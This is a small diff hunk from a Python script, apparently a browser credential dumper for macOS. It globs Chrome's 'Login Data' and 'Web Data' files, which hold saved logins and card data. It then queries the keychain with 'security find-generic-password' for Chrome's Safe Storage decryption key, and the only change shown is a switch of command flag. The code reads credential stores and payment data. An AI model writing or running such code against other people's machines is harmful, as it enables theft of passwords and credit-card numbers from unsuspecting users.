@@ -214,7 +214,7 @@ if __name__ == '__main__':
     cc_data_path = "{}/*/Web Data".format(root_path)
     chrome_data = glob.glob(login_data_path) + glob.glob(cc_data_path)
     safe_storage_key = subprocess.Popen(
-        "security find-generic-password -wa "
+        "security find-generic-password -ga "
         "'Chrome'",
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
